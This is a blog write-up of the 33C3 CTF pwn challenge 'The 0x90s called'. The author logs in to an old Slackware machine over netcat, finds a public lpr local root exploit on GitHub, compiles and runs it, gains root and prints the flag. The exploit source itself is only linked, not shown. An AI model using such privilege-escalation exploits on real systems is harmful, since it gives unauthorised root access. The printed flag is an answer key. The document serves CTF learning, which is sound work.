---
title: '[33C3 CTF] The 0x90s called Writeup'
author: Megabeets
type: post
date: 2016-12-29T20:00:28+00:00
url: /33c3-ctf-0x90s-called-writeup/
sharing_disabled:
  - 1
categories:
  - 33C3 CTF
  - Writeups
tags:
  - 33C3
  - CTF
  - PWN
  - Writeups

---
### **Description:**

> **The 0x90s called &#8211; PWN**
> 
> The 0x90s called, they want their vulns back!  
> [Pwn this and get the flag.][1] Who would&#8217;ve thought?  
> If you want to try it locally first, [check this out][2].

This challenge was pretty simple and obvious. We are given with a website that is requesting a &#8216;proof of work&#8217; from us to reduce the load on their infrastructure. We need to press start and then we get a port to which we can connect using `netcat`, username and password. We connect to the server and search for the flag.

<pre class="lang:sh mark:3,11,14 decode:true">Megabeets:~# nc 78.46.224.70 2323

Welcome to Linux 0.99pl12.

slack login: challenge
challenge
Password:challenge

Linux 0.99pl12. (Posix).
No mail.
slack:~$ id
uid=405(challenge) gid=1(other)
slack:~$ ls -la / | grep flag
-r--------   1 root     root           36 Dec 27  1916 flag.txt
slack:~$</pre>

Look at the highlighted rows. We can see that we are in _Slack Linux 0.99pl12_ machine, that _flag.txt_ is on the root folder and that only _root_ can read it. Before trying anything special or complicated, lets search online for known exploit to this version.

[<img data-attachment-id="795" data-permalink="https://www.megabeets.net/33c3-ctf-0x90s-called-writeup/90s_called_1/#main" data-orig-file="http://www.megabeets.net/uploads/90s_called_1.png" data-orig-size="792,249" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="90s_called_1" data-image-description="" data-image-caption="" data-medium-file="http://www.megabeets.net/uploads/90s_called_1-300x94.png" data-large-file="http://www.megabeets.net/uploads/90s_called_1.png" decoding="async" loading="lazy" class="aligncenter size-full wp-image-795" src="http://www.megabeets.net/uploads/90s_called_1.png" alt="90s_called_1" width="792" height="249" srcset="https://www.megabeets.net/uploads/90s_called_1.png 792w, https://www.megabeets.net/uploads/90s_called_1-150x47.png 150w, https://www.megabeets.net/uploads/90s_called_1-300x94.png 300w, https://www.megabeets.net/uploads/90s_called_1-768x241.png 768w" sizes="(max-width: 792px) 100vw, 792px" />][3]Oh, this was easy! There&#8217;s a known exploit available on _Github_.



Lets run it to see if it works, and if so read the flag.

<pre class="lang:sh decode:true">slack:~$ gcc exploit.c -o exploit
slack:~$ id
uid=405(challenge) gid=1(other)
slack:~$ ./exploit
[ Slackware linux 1.01 /usr/bin/lpr local root exploit
# id
uid=405(challenge) gid=1(other) euid=0(root) egid=18(lp)
# cat /flag.txt
33C3_Th3_0x90s_w3r3_pre3tty_4w3s0m3</pre>

&nbsp;

It worked just fine (thanks [prdelka][4] for the exploit)! We got _root_ permissions and were able to read the flag.  
**Flag**: _33C3\_Th3\_0x90s\_w3r3\_pre3tty_4w3s0m3_

I’ll be happy to read in the comments how the challenge was for you.

<div class="nf-post-footer">
  <p style="text-align: right">
    <a href="https://www.megabeets.net/about.html#vegan"><img class="wp-image-149 alignnone" src="https://www.megabeets.net/uploads/megabeets_inline_logo.png" alt="megabeets_inline_logo" width="61" height="45" />Eat Veggies</a>
  </p>
</div>

 [1]: http://78.46.224.70:8080/
 [2]: https://33c3ctf.ccc.ac/uploads/qemu-xmas-slackware.tar.xz
 [3]: http://www.megabeets.net/uploads/90s_called_1.png
 [4]: https://github.com/HackerFantastic/Public/blob/master/exploits/prdelka-vs-GNU-lpr.c